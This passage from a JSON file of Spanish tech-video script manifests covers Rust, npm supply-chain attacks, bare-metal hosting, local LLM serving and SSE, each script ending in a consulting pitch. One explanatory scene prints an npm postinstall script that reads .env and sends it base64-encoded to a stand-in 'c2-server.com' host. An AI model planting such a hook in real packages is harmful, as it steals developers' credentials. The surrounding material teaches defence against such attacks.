    "topicNum": "08",
    "group": "08. RUST SISTEMAS CRITICOS",
    "label": "Var B (Polémico): Por qué Discord y Cloudflare mataron Go y adoptaron Rust",
    "variation": "B (Polémico)",
    "category": "LENGUAJES DE SISTEMAS & RENDIMIENTO",
    "manifest": {
      "title": "[08] Por qué Discord y Cloudflare mataron Go y adoptaron Rust (Var B)",
      "category": "LENGUAJES DE SISTEMAS & RENDIMIENTO",
      "slug": "08_rust_sistemas_criticos",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_rust_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Discord tenía millones de usuarios activos y su servicio en Go se congelaba cada dos minutos por culpa de las pausas del Garbage Collector.",
          "visual_cue": "Gancho cinético sobre el caso de estudio de Discord",
          "props": {
            "badge": "CASOS REALES DE INGENIERÍA",
            "lines": [
              {
                "text": "POR QUÉ DISCORD",
                "color": "#ffffff"
              },
              {
                "text": "MATÓ GO POR RUST",
                "color": "#f97316"
              }
            ],
            "subtitle": "ELIMINANDO LOS PICOS DE LATENCIA P99",
            "icon": "rust_gear"
          }
        },
        {
          "id": "latency_gc",
          "type": "metrics_comparison",
          "duration": 6,
          "voiceover": "Reescribieron el servicio en Rust. La latencia p99 pasó de cientos de milisegundos a una línea plana estable por debajo de un milisegundo.",
          "visual_cue": "Comparativa gráfica de p99 latency con Garbage Collection vs Rust",
          "props": {
            "header": "MÉTRICAS DE RENDIMIENTO REAL",
            "metricA": {
              "label": "GO RUNTIME (GC SPIKES)",
              "value": "180ms p99",
              "sub": "Picos cada 2 minutos por barrido de memoria",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "RUST (DETERMINISTIC)",
              "value": "0.8ms p99",
              "sub": "Línea completamente plana 24/7",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "cta_rust_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Construyo software de alto rendimiento y arquitectura sin picos de latencia. Si buscas un lead engineer para tu infraestructura, link en mi biografía.",
          "visual_cue": "Cierre con contratación senior",
          "props": {
            "header": "CONTRATACIÓN SENIOR BACKEND",
            "title": "SISTEMAS DE BAJA LATENCIA & ALTO RENDIMIENTO",
            "cta": {
              "badge": "LEAD ENGINEER // SEDEV",
              "text": "Desarrollo de servicios backend de misión crítica. Hablemos en el enlace de mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "09_A",
    "topicNum": "09",
    "group": "09. SEGURIDAD SUPPLY CHAIN",
    "label": "Var A (Técnico): Anatomía de un malware en NPM: Robo de .env en scripts postinstall",
    "variation": "A (Técnico)",
    "category": "CIBERSEGURIDAD & SUPPLY CHAIN",
    "manifest": {
      "title": "[09] Anatomía de un malware en NPM: Robo de .env en scripts postinstall (Var A)",
      "category": "CIBERSEGURIDAD & SUPPLY CHAIN",
      "slug": "09_seguridad_supply_chain",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_security",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Sabías que ejecutar npm install puede darle acceso total a tu computadora a un hacker? Así funciona un ataque de supply chain en 2026.",
          "visual_cue": "Gancho cinético sobre malware en dependencias",
          "props": {
            "badge": "CIBERSEGURIDAD 2026",
            "lines": [
              {
                "text": "ANATOMÍA DE UN",
                "color": "#ffffff"
              },
              {
                "text": "MALWARE EN NPM",
                "color": "#ef4444"
              }
            ],
            "subtitle": "ROBO DE SECRETOS VIA SCRIPTS POSTINSTALL",
            "icon": "zero_trust_lock"
          }
        },
        {
          "id": "exploit_code",
          "type": "code_terminal",
          "duration": 6.5,
          "voiceover": "El paquete parece una utilidad inofensiva, pero su script postinstall lee tus variables de entorno y las envía codificadas a un servidor externo.",
          "visual_cue": "Terminal mostrando el payload malicioso oculto en package.json",
          "props": {
            "header": "PAYLOAD DEL ATACANTE",
            "title": "SCRIPT POSTINSTALL OFUSCADO",
            "filename": "node_modules/fake-lib/package.json",
            "codeLines": [
              "\"scripts\": {",
              "  \"postinstall\": \"node -e \\\"const fs=require('fs'),https=require('https');",
              "    const env = fs.readFileSync('.env', 'utf8');",
              "    https.get('https://c2-server.com/leak?d=' + Buffer.from(env).toString('base64'));\\\"\"",
              "}",
              "// Las claves de AWS, Stripe y bases de datos quedan expuestas"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "leak_pipe",
          "type": "network_pipeline",
          "duration": 6,
          "voiceover": "El desarrollador ni siquiera se da cuenta porque el comando npm install termina exitosamente mientras sus credenciales viajan por la red.",
          "visual_cue": "Pipeline visual mostrando la exfiltración silenciosa hacia el servidor de comando y control",
          "props": {
            "header": "EXFILTRACIÓN SILENCIOSA",
            "title": "FILTRACIÓN DE CLAVES .ENV",
            "subtitle": "TRÁFICO DE SALIDA SIN BARRERAS DE RED",
            "stages": [
              {
                "id": "dev",
                "label": "TERMINAL DEL DESARROLLADOR",
                "sub": "npm install ejecutado con permisos root/locales",
                "y": 220,
                "color": "#ef4444",
                "metric": "Comprometido"
              },
              {
                "id": "network",
                "label": "EXFILTRACIÓN HTTPS",
                "sub": "Envío de payload base64 en puerto 443",
                "y": 520,
                "color": "#fbbf24",
                "metric": "Sin bloqueo"
              },
              {
                "id": "c2",
                "label": "SERVIDOR DEL ATACANTE",
                "sub": "Extracción automática de AWS_SECRET_ACCESS_KEY",
                "y": 820,
                "color": "#a855f7",
                "metric": "Claves robadas"
              }
            ]
          }
        },
        {
          "id": "cta_security",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la seguridad de dependencias y diseño pipelines Zero-Trust para empresas que quieren blindar su código. Link en mi biografía.",
          "visual_cue": "Cierre con auditoría de seguridad de dependencias",
          "props": {
            "header": "AUDITORÍA DE SEGURIDAD & SUPPLY CHAIN",
            "title": "PROTEGE TU CADENA DE SUMINISTRO",
            "cta": {
              "badge": "AUDITORÍA DE SEGURIDAD // SEDEV",
              "text": "¿Revisas qué ejecutan tus paquetes de NPM? Link en mi perfil para auditar tu pipeline."
            }
          }
        }
      ]
    }
  },
  {
    "key": "09_B",
    "topicNum": "09",
    "group": "09. SEGURIDAD SUPPLY CHAIN",
    "label": "Var B (Polémico): GitHub desactiva postinstall: Cómo blindar tu pipeline Zero-Trust",
    "variation": "B (Polémico)",
    "category": "CIBERSEGURIDAD & SUPPLY CHAIN",
    "manifest": {
      "title": "[09] GitHub desactiva postinstall: Cómo blindar tu pipeline Zero-Trust (Var B)",
      "category": "CIBERSEGURIDAD & SUPPLY CHAIN",
      "slug": "09_seguridad_supply_chain",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_security_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "GitHub y la industria están desactivando los scripts postinstall por defecto. Es momento de blindar tus dependencias con Zero-Trust.",
          "visual_cue": "Gancho cinético sobre blindaje Zero-Trust",
          "props": {
            "badge": "DEFENSA EN CI/CD",
            "lines": [
              {
                "text": "BLINDA TU PIPELINE",
                "color": "#ffffff"
              },
              {
                "text": "CON ZERO-TRUST",
                "color": "#10b981"
              }
            ],
            "subtitle": "BLOQUEO ESTRICTO DE SCRIPTS NO AUTORIZADOS",
            "icon": "zero_trust_lock"
          }
        },
        {
          "id": "sandbox_terminal",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Con la bandera ignore-scripts y aislación en sandboxes efímeros, neutralizas cualquier ataque antes de que pueda tocar tus archivos locales.",
          "visual_cue": "Terminal configurando npm config set ignore-scripts true",
          "props": {
            "header": "CONFIGURACIÓN DEFENSIVA",
            "title": "POLÍTICAS DE INSTALACIÓN SEGURA",
            "filename": ".npmrc",
            "codeLines": [
              "# Desactiva ejecución arbitraria de scripts en dependencias",
              "ignore-scripts=true",
              "audit=true",
              "engine-strict=true",
              "# Si un paquete requiere compilar binarios, debe ser autorizado manualmente"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "cta_security_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la postura de seguridad de tu infraestructura y configuro entornos blindados contra fugas de datos. Agenda en mi perfil.",
          "visual_cue": "Cierre con auditoría de ciberseguridad",
          "props": {
            "header": "AUDITORÍA DE CIBERSEGURIDAD",
            "title": "ZERO-TRUST EN TUS PIPELINES DE DESPLIEGUE",
            "cta": {
              "badge": "AUDITORÍA DE SEGURIDAD // SEDEV",
              "text": "Protege tus credenciales y entorno productivo. Link directo en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "10_A",
    "topicNum": "10",
    "group": "10. EXODO BARE METAL KAMAL",
    "label": "Var A (Técnico): Kamal en Producción: Despliegue Zero-Downtime sin Kubernetes",
    "variation": "A (Técnico)",
    "category": "INFRAESTRUCTURA & CLOUD COSTS",
    "manifest": {
      "title": "[10] Kamal en Producción: Despliegue Zero-Downtime sin Kubernetes (Var A)",
      "category": "INFRAESTRUCTURA & CLOUD COSTS",
      "slug": "10_exodo_bare_metal_kamal",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_kamal",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Cómo desplegar aplicaciones en contenedores con cero tiempo de inactividad sin la pesadilla de mantener un clúster de Kubernetes? Con Kamal.",
          "visual_cue": "Gancho cinético sobre Kamal y bare metal",
          "props": {
            "badge": "DEVOPS EN 2026",
            "lines": [
              {
                "text": "KAMAL: ADIÓS A",
                "color": "#ffffff"
              },
              {
                "text": "KUBERNETES",
                "color": "#38bdf8"
              }
            ],
            "subtitle": "ZERO-DOWNTIME DEPLOYS EN SERVIDORES SIMPLES",
            "icon": "server_rack"
          }
        },
        {
          "id": "kamal_flow",
          "type": "architecture_flow",
          "duration": 6.5,
          "voiceover": "Kamal levanta el nuevo contenedor, verifica el health check, cambia el tráfico a nivel de proxy Traefik y destruye el contenedor viejo sin perder una petición.",
          "visual_cue": "Diagrama de despliegue blue/green con proxy de balanceo",
          "props": {
            "header": "MECANISMO DE DESPLIEGUE",
            "title": "ROLLING RESTART CON TRAEFIK",
            "nodes": [
              {
                "id": "proxy",
                "label": "TRAEFIK PROXY REVERSE",
                "sublabel": "Manejo automático de certificados SSL y rutas",
                "color": "#38bdf8",
                "y": 160
              },
              {
                "id": "app_new",
                "label": "NUEVO CONTENEDOR (V2)",
                "sublabel": "Health check verificado en localhost:8001",
                "color": "#10b981",
                "y": 520
              },
              {
                "id": "app_old",
                "label": "CONTENEDOR ANTIGUO (V1)",
                "sublabel": "Drenado suave de conexiones activas",
                "color": "#71717a",
                "y": 880
              }
            ]
          }
        },
        {
          "id": "kamal_deploy",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Todo se configura en un simple archivo YAML. Un comando en tu terminal y tu aplicación queda en producción en tus propios servidores.",
          "visual_cue": "Terminal ejecutando kamal deploy con salida de docker tags",
          "props": {
            "header": "CONFIGURACIÓN DECLARATIVA",
            "title": "DEPLOY CON UN SOLO COMANDO",
            "filename": "config/deploy.yml",
            "codeLines": [
              "service: api-core",
              "image: registry.gitlab.com/sedev/api",
              "servers:",
              "  web:",
              "    - 159.69.10.42 # Servidor Hetzner $40/mo",
              "kamal deploy # ✔ Completado en 24 segundos con 0s downtime"
            ],
            "cursorLine": 5
          }
        },
        {
          "id": "cta_kamal",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Si tu empresa quema dinero en AWS y quieres migrar a una infraestructura simple en servidores dedicados, te asesoro en el proceso. Link en mi perfil.",
          "visual_cue": "Cierre con auditoría y migración cloud",
          "props": {
            "header": "MIGRACIÓN & AUDITORÍA CLOUD",
            "title": "REDUCE FACTURA HASTA UN 80%",
            "cta": {
              "badge": "AUDITORÍA CLOUD // SEDEV",
              "text": "¿Facturas absurdas en AWS o GCP? Agenda una sesión de migración en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "10_B",
    "topicNum": "10",
    "group": "10. EXODO BARE METAL KAMAL",
    "label": "Var B (Polémico): De $15.000 a $200 al mes: El éxodo de la nube a servidores Hetzner",
    "variation": "B (Polémico)",
    "category": "INFRAESTRUCTURA & CLOUD COSTS",
    "manifest": {
      "title": "[10] De $15.000 a $200 al mes: El éxodo de la nube a servidores Hetzner (Var B)",
      "category": "INFRAESTRUCTURA & CLOUD COSTS",
      "slug": "10_exodo_bare_metal_kamal",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_kamal_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "37signals y cientos de empresas abandonaron la nube pública y pasaron de pagar cientos de miles de dólares a una fracción en servidores dedicados.",
          "visual_cue": "Gancho cinético sobre el ahorro astronómico del bare metal",
          "props": {
            "badge": "ÉXODO DE LA NUBE",
            "lines": [
              {
                "text": "DE $15.000 A $200",
                "color": "#10b981"
              },
              {
                "text": "AL MES EN BARE-METAL",
                "color": "#ffffff"
              }
            ],
            "subtitle": "EL REGRESO A LOS SERVIDORES FÍSICOS",
            "icon": "server_rack"
          }
        },
        {
          "id": "split_aws_hetzner",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "En AWS pagas por CPU estrangulada y transferencias de datos ridículas. En un servidor dedicado tienes 128 gigas de RAM y discos NVMe directos.",
          "visual_cue": "Doble terminal comparando especificaciones de hardware y factura mensual",
          "props": {
            "header": "COMPARATIVA DE HARDWARE & COSTES",
            "title": "VIRTUALIZACIÓN AWS VS SERVIDOR FÍSICO HETZNER",
            "termA": {
              "title": "AWS CLOUD (EKS + RDS + NAT)",
              "color": "#ef4444",
              "cmd": "aws billing get-monthly-forecast",
              "status": "Facturación por cada gigabyte de egress",
              "time": "$14,800/mes",
              "lines": [
                "CPU compartida con vecinos ruidosos",
                "Coste por transferencia de datos: $0.09 por GB",
                "Complejidad: 40 servicios conectados en AWS Console"
              ]
            },
            "termB": {
              "title": "HETZNER DEDICATED SERVER",
              "color": "#10b981",
              "cmd": "lscpu && free -h",
              "status": "AMD EPYC 32 Cores // 128GB DDR5 RAM // 2x 2TB NVMe",
              "time": "$190/mes",
              "lines": [
                "100% de la CPU física dedicada a tu app",
                "Tráfico ilimitado a 1 Gbps incluido",
                "Despliegues sencillos con Docker y Kamal"
              ]
            }
          }
        },
        {
          "id": "cta_kamal_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño planes de migración a bare-metal para recortar costes y multiplicar la velocidad de tu backend. Hablemos en el enlace de mi perfil.",
          "visual_cue": "Cierre con auditoría de infraestructura",
          "props": {
            "header": "PLAN DE MIGRACIÓN BARE-METAL",
            "title": "AHORRA MILES DE DÓLARES EN INFRAESTRUCTURA",
            "cta": {
              "badge": "AUDITORÍA DE COSTES // SEDEV",
              "text": "¿Listo para salir de la trampa de costes de la nube? Link en mi perfil para agendar tu plan."
            }
          }
        }
      ]
    }
  },
  {
    "key": "11_A",
    "topicNum": "11",
    "group": "11. MODELOS LOCALES VLLM",
    "label": "Var A (Técnico): Cómo funciona la cuantización a 4 bits: GGUF sin perder inteligencia",
    "variation": "A (Técnico)",
    "category": "AI INFRASTRUCTURE & OPEN WEIGHTS",
    "manifest": {
      "title": "[11] Cómo funciona la cuantización a 4 bits: GGUF sin perder inteligencia (Var A)",
      "category": "AI INFRASTRUCTURE & OPEN WEIGHTS",
      "slug": "11_modelos_locales_vllm",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_quant",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Cómo comprimir un modelo de inteligencia artificial de treinta gigabytes para que corra en tu servidor a cien palabras por segundo? Con cuantización a 4 bits.",
          "visual_cue": "Gancho cinético sobre cuantización de modelos",
          "props": {
            "badge": "MODELOS ABIERTOS 2026",
            "lines": [
              {
                "text": "CUANTIZACIÓN A 4 BITS",
                "color": "#ffffff"
              },
              {
                "text": "SIN PERDER CALIDAD",
                "color": "#a855f7"
              }
            ],
            "subtitle": "OPTIMIZACIÓN DE PESOS // GGUF & AWQ",
            "icon": "cpu"
          }
        },
        {
          "id": "memory_quant",
          "type": "memory_layout",
          "duration": 6,
          "voiceover": "Pasar los pesos de 16 bits flotantes a enteros de 4 bits reduce la memoria por cuatro y permite que todo el modelo quepa en la memoria VRAM de tu GPU.",
          "visual_cue": "Layout de memoria comparando FP16 (2 bytes por peso) vs INT4 (0.5 bytes por peso)",
          "props": {
            "header": "REDUCCIÓN DE HUELLA EN VRAM",
            "title": "FP16 VS CUANTIZACIÓN INT4",
            "items": [
              {
                "name": "PESOS ORIGINALES (FP16)",
                "addr": "16 BITS POR PESO",
                "value": "Requiere 32GB VRAM // Servidor caro",
                "color": "#ef4444"
              },
              {
                "name": "PESOS CUANTIZADOS (INT4)",
                "addr": "4 BITS POR PESO",
                "value": "Solo 8GB VRAM // Corre en hardware accesible",
                "color": "#10b981"
              }
            ]
          }
        },
        {
          "id": "vllm_speed",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Con motores como vLLM y PagedAttention, el servidor procesa peticiones en lotes continuos multiplicando la velocidad de inferencia.",
          "visual_cue": "Terminal levantando vLLM con modelo cuantizado",
          "props": {
            "header": "INFERENCIA DE ALTO RENDIMIENTO",
            "title": "VLLM CON PAGEDATTENTION",
            "filename": "deploy/vllm.sh",
            "codeLines": [
              "vllm serve Qwen2.5-Coder-32B-Instruct-AWQ \\",
              "  --gpu-memory-utilization 0.95 \\",
              "  --max-model-len 32768 \\",
              "  --port 8000",
              "# Rendimiento: 120 tokens/s con 40 usuarios concurrentes"
            ],
            "cursorLine": 5
          }
        },
        {
          "id": "cta_quant",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Ayudo a empresas a desplegar clústeres de inferencia privada con modelos abiertos para no depender de APIs externas. Contáctame en mi perfil.",
          "visual_cue": "Cierre con consultoría de IA privada",
          "props": {
            "header": "CONSULTORÍA DE IA PRIVADA",
            "title": "SOBERANÍA TOTAL DE TUS MODELOS",
            "cta": {
              "badge": "INGENIERÍA DE IA // SEDEV",
              "text": "¿Quieres correr modelos locales sin pagar APIs caras? Link en mi bio para agendar una sesión."
            }
          }
        }
      ]
    }
  },
  {
    "key": "11_B",
    "topicNum": "11",
    "group": "11. MODELOS LOCALES VLLM",
    "label": "Var B (Polémico): Soberanía de Datos: Corre 100 tokens/s en local sin pagar APIs",
    "variation": "B (Polémico)",
    "category": "AI INFRASTRUCTURE & OPEN WEIGHTS",
    "manifest": {
      "title": "[11] Soberanía de Datos: Corre 100 tokens/s en local sin pagar APIs (Var B)",
      "category": "AI INFRASTRUCTURE & OPEN WEIGHTS",
      "slug": "11_modelos_locales_vllm",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_quant_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Pagar tokens por cada petición a OpenAI está arruinando tus márgenes y exponiendo los datos privados de tus clientes.",
          "visual_cue": "Gancho cinético sobre soberanía y costes de API",
          "props": {
            "badge": "SOBERANÍA DE DATOS",
            "lines": [
              {
                "text": "DEJA DE PAGAR TOKENS",
                "color": "#ef4444"
              },
              {
                "text": "A PROVEEDORES DE IA",
                "color": "#ffffff"
              }
            ],
            "subtitle": "INFERENCIA LOCAL A UNA FRACCIÓN DEL COSTE",
            "icon": "server_rack"
          }
        },
        {
          "id": "split_api_vs_local",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "Un solo servidor con GPUs dedicadas te da inferencia ilimitada por una tarifa fija mensual y con privacidad matemática absoluta.",
          "visual_cue": "Doble terminal: API externa facturando por token vs Servidor propio con inferencia fija",
          "props": {
            "header": "ANÁLISIS FINANCIERO",
            "title": "APIS PROPIETARIAS VS HARDWARE PROPIO",
            "termA": {
              "title": "APIS PROPIETARIAS EN LA NUBE",
              "color": "#ef4444",
              "cmd": "api.openai.com/v1/chat/completions",
              "status": "Factura escalando sin control",
              "time": "$6,200/mes",
              "lines": [
                "Pagas por cada prompt y cada respuesta",
                "Riesgo de rate limits y caídas imprevistas",
                "Tus datos sensibles viajan a servidores de terceros"
              ]
            },
            "termB": {
              "title": "SERVIDOR DE INFERENCIA VLLM",
              "color": "#10b981",
              "cmd": "localhost:8000/v1/chat/completions",
              "status": "Tarifa plana de servidor con 2x RTX 4090",
              "time": "$320/mes",
              "lines": [
                "Inferencia ilimitada las 24 horas del día",
                "Latencia local de 15ms sin salir de tu VPC",
                "Cumplimiento estricto de privacidad GDPR / HIPAA"
              ]
            }
          }
        },
        {
          "id": "cta_quant_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño e implemento infraestructura de IA on-premise y clústeres vLLM para empresas. Agenda tu diagnóstico en mi perfil.",
          "visual_cue": "Cierre con consultoría de IA privada",
          "props": {
            "header": "CONSULTORÍA DE IA ON-PREMISE",
            "title": "INFRAESTRUCTURA PRIVADA DE INFERENCIA",
            "cta": {
              "badge": "CONSULTORÍA DE IA // SEDEV",
              "text": "Recorta costes de API y asegura la privacidad de tus datos. Link en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "12_A",
    "topicNum": "12",
    "group": "12. SSE VS WEBSOCKETS",
    "label": "Var A (Técnico): Por qué Server-Sent Events es superior a WebSockets en HTTP/2",
    "variation": "A (Técnico)",
    "category": "REDES & PROTOCOLOS WEB",
    "manifest": {
      "title": "[12] Por qué Server-Sent Events es superior a WebSockets en HTTP/2 (Var A)",
      "category": "REDES & PROTOCOLOS WEB",
      "slug": "12_sse_vs_websockets",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_sse",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Por qué toda la industria de IA usa Server-Sent Events en lugar de WebSockets para hacer streaming de texto? La respuesta está en HTTP/2.",
          "visual_cue": "Gancho cinético sobre streaming SSE",
          "props": {
            "badge": "REDES & STREAMING 2026",
            "lines": [
              {
                "text": "SERVER-SENT EVENTS",
                "color": "#ffffff"
              },
              {
                "text": "VS WEBSOCKETS",
                "color": "#06b6d4"
              }
            ],
            "subtitle": "LA SIMPLICIDAD QUE CONQUISTÓ LA IA",
            "icon": "network_packet"
          }
        },
        {
          "id": "sse_pipe",
          "type": "network_pipeline",
          "duration": 6.5,
          "voiceover": "WebSockets requiere un handshake especial y salirse de HTTP. SSE es una petición HTTP estándar que aprovecha compresión, proxies y multiplexación.",
          "visual_cue": "Pipeline visual mostrando la conexión HTTP/2 multiplexando múltiples streams",
          "props": {
            "header": "TRANSPORTE DE PROTOCOLO",
            "title": "MULTIPLEXACIÓN HTTP/2 NATIVA",
            "subtitle": "UN SOLO SOCKET TCP PARA CIENTOS DE STREAMS",
            "stages": [
              {
                "id": "client",
                "label": "BROWSER / EVENTSOURCE",
                "sub": "Reconexión automática nativa sin JS",
                "y": 220,
                "color": "#38bdf8",
                "metric": "Nativo"
              },
              {
                "id": "edge",
                "label": "CLOUDFLARE / NGINX PROXY",
                "sub": "Manejo de caché y compresión estándar",
                "y": 520,
                "color": "#10b981",
                "metric": "Zero custom rules"
              },
              {
                "id": "server",
                "label": "BACKEND NODE / RUST",
                "sub": "Content-Type: text/event-stream",
                "y": 820,
                "color": "#06b6d4",
                "metric": "Simple loop"
              }
            ]
          }
        },
        {
          "id": "sse_code",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "En el navegador no necesitas librerías pesadas. EventSource maneja reconexión automática si el usuario pierde la señal wifi.",
          "visual_cue": "Terminal mostrando código limpio de EventSource en cliente y servidor",
          "props": {
            "header": "IMPLEMENTACIÓN LIMPIA",
            "title": "CLIENTE NATIVO EVENTSOURCE",
            "filename": "client/stream.ts",
            "codeLines": [
              "const es = new EventSource(\"/api/generate\");",
              "es.onmessage = (event) => {",
              "  terminal.append(event.data);",
              "};",
              "// Si el internet cae, el navegador reconecta solo enviando Last-Event-ID",
              "es.onerror = () => console.log(\"Reconectando automáticamente...\");"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "cta_sse",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño arquitecturas backend en tiempo real y streaming de alta concurrencia. Si buscas un desarrollador senior para tu producto, link en mi bio.",
          "visual_cue": "Cierre con contratación senior backend",
          "props": {
            "header": "CONTRATACIÓN SENIOR BACKEND",
            "title": "SISTEMAS DISTRIBUIDOS & TIEMPO REAL",
            "cta": {
              "badge": "SENIOR BACKEND ENGINEER // SEDEV",
              "text": "¿Necesitas arquitectura de streaming robusta? Hablemos en el enlace de mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "12_B",
    "topicNum": "12",
    "group": "12. SSE VS WEBSOCKETS",
    "label": "Var B (Polémico): No compliques tu stack: Deja de usar WebSockets para simples streams",
    "variation": "B (Polémico)",
    "category": "REDES & PROTOCOLOS WEB",
    "manifest": {
      "title": "[12] No compliques tu stack: Deja de usar WebSockets para simples streams (Var B)",
      "category": "REDES & PROTOCOLOS WEB",
      "slug": "12_sse_vs_websockets",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_sse_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Usar WebSockets solo para mostrar texto progresivo o notificaciones es matar moscas a cañonazos y complicar tus balanceadores de carga.",
          "visual_cue": "Gancho cinético contra el uso excesivo de WebSockets",
          "props": {
            "badge": "SIMPLICIDAD DE ARQUITECTURA",
            "lines": [
              {
                "text": "DEJA DE USAR",
                "color": "#ef4444"
              },
              {
                "text": "WEBSOCKETS",
                "color": "#ffffff"
              }
            ],
            "subtitle": "CUÁNDO USAR CADA PROTOCOLO",
            "icon": "network_packet"
          }
        },
        {
          "id": "tradeoff_ws_sse",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "Reserva WebSockets únicamente para cuando necesitas comunicación bidireccional continua como juegos multijugador o audio en vivo.",
          "visual_cue": "Matriz comparativa de casos de uso reales",
          "props": {
            "header": "CRITERIO DE SELECCIÓN",
            "title": "SERVER-SENT EVENTS VS WEBSOCKETS",
            "colA": "SERVER-SENT EVENTS (SSE)",
            "colB": "WEBSOCKETS (WS)",
            "rows": [
              {
                "dim": "Streaming de IA & Notificaciones",
                "a": "✔ Perfecto y nativo",
                "b": "✖ Sobreingeniería",
                "aGood": true
              },
              {
                "dim": "Reconexión automática",
                "a": "✔ Manejada por el browser",
                "b": "✖ Manual con código JS",
                "aGood": true
              },
              {
                "dim": "Compatibilidad con Proxies",
                "a": "✔ HTTP/2 estándar",
                "b": "✖ Requiere Upgrade HTTP",
                "aGood": true
              },
              {
                "dim": "Juegos online & Audio full-duplex",
                "a": "✖ Unidireccional",
                "b": "✔ Ideal para bidireccional",
                "aGood": false
              }
            ]
          }
        },
        {
          "id": "cta_sse_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la arquitectura de red de aplicaciones web para simplificar el stack y mejorar la fiabilidad. Agenda en el link de mi perfil.",
          "visual_cue": "Cierre con auditoría de arquitectura",
          "props": {
            "header": "AUDITORÍA DE ARQUITECTURA WEB",
            "title": "SIMPLIFICA TUS CONEXIONES DE RED",
            "cta": {
              "badge": "AUDITORÍA DE ARQUITECTURA // SEDEV",
              "text": "Elimina complejidad innecesaria en tu backend. Link en mi perfil para agendar tu revisión."
            }
          }
        }
      ]
    }
  },
  {
    "key": "13_A",
    "topicNum": "13",
    "group": "13. BUN VS NODE22",
    "label": "Var A (Técnico): V8 vs JavaScriptCore: Cómo Node 22 contraatacó con TypeScript nativo",
    "variation": "A (Técnico)",
    "category": "JAVASCRIPT RUNTIMES & HERRAMIENTAS",
    "manifest": {
      "title": "[13] V8 vs JavaScriptCore: Cómo Node 22 contraatacó con TypeScript nativo (Var A)",
      "category": "JAVASCRIPT RUNTIMES & HERRAMIENTAS",
      "slug": "13_bun_vs_node22",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_runtime",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Cómo respondió Node.js ante la amenaza de Bun? Con soporte nativo de TypeScript y SQLite integrado en Node veintidós.",
          "visual_cue": "Gancho cinético sobre la guerra de runtimes de JavaScript",
          "props": {
            "badge": "RUNTIMES JS EN 2026",
            "lines": [
              {
                "text": "BUN VS NODE.JS 22",
                "color": "#ffffff"
              },
              {
                "text": "LA GUERRA TOTAL",
                "color": "#fbbf24"
              }
            ],
            "subtitle": "TYPESCRIPT NATIVO // V8 VS JSC",
            "icon": "terminal"
          }
        },
        {
          "id": "runtime_split",
          "type": "terminal_split",
          "duration": 6.5,
          "voiceover": "Bun corre sobre JavaScriptCore y está escrito en Zig. Node veintidós ahora permite ejecutar archivos TypeScript sin compilar usando type-stripping nativo.",
          "visual_cue": "Doble terminal ejecutando TypeScript en ambos entornos sin transpiladores externos",
          "props": {
            "header": "EJECUCIÓN DE TYPESCRIPT SIN BUILD",
            "title": "ZERO-COMPILATION TYPESCRIPT RUNNERS",
            "termA": {
              "title": "NODE.JS 22 (--experimental-strip-types)",
              "color": "#38bdf8",
              "cmd": "node --strip-types server.ts",
              "status": "Elimina tipos en memoria y ejecuta en V8",
              "time": "0.12s cold start",
              "lines": [
                "Cero dependencias: Ni ts-node ni tsx requeridos",
                "Soporte nativo de módulo de SQLite (node:sqlite)",
                "Test runner nativo integrado con mock engine"
              ]
            },
            "termB": {
              "title": "BUN 1.2 (JAVASCRIPTCORE + ZIG)",
              "color": "#10b981",
              "cmd": "bun server.ts",
              "status": "Transpila y optimiza en código máquina nativo",
              "time": "0.015s cold start",
              "lines": [
                "Arranque ultra rápido en 15 milisegundos",
                "Empaqueta a binario ejecutable único (bun build --compile)",
                "Syscalls de red hiperoptimizadas en Zig"
              ]
            }
          }
        },
        {
          "id": "cta_runtime",
          "type": "tradeoff_matrix",
          "duration": 5,
